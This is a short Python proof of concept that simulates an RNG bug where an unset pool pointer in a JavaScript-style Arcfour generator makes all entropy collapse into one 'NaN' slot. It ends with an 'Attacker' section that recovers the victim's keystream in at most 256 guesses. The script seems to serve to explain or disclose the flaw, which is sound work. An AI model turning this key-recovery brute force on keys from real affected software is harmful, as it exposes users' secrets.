import os


from rng_nan_bug import NAN, Arcfour, JSArray, js_inc



def write_bytes(label, pptr, data):
    pool = JSArray()
    print(f"\n=== {label}: rng_pptr starts as {'undefined' if pptr is None else pptr} ===")
    for byte in data:
        box = pptr
        pptr = js_inc(pptr)
        pool.xor_set(box, byte)
        name = "undefined" if box is None else box
        print(f"  write {byte:3}  -> box {name!s:9}   pool now {pool.props}")
    print(f"  pool.length = {pool.length}")
    return pool



def rc4_reads(pool):
    n = pool.length
    reads = [NAN if n == 0 else i % n for i in range(256)]
    print(f"  RC4 reads boxes: {reads[:6]} ... (256 reads, {len(set(map(str, reads)))} distinct box)")



def first_bytes(pool, n=8):
    r = Arcfour()
    r.init(pool)
    return bytes(r.next() for _ in range(n))



if __name__ == "__main__":
    data = list(os.urandom(6))


    good = write_bytes("With rng_pptr = 0", 0, data)
    rc4_reads(good)


    bad = write_bytes("Bug: rng_pptr never set", None, data)
    rc4_reads(bad)


    secret = first_bytes(bad)
    print(f"\n=== Attacker ===\n  victim's random bytes: {secret.hex()}")
    for guess in range(256):
        trial = JSArray()
        trial.set(NAN, guess)
        if first_bytes(trial) == secret:
            print(f"  tried {guess + 1} guesses -> box \"NaN\" = {guess}, stream matches")
            break

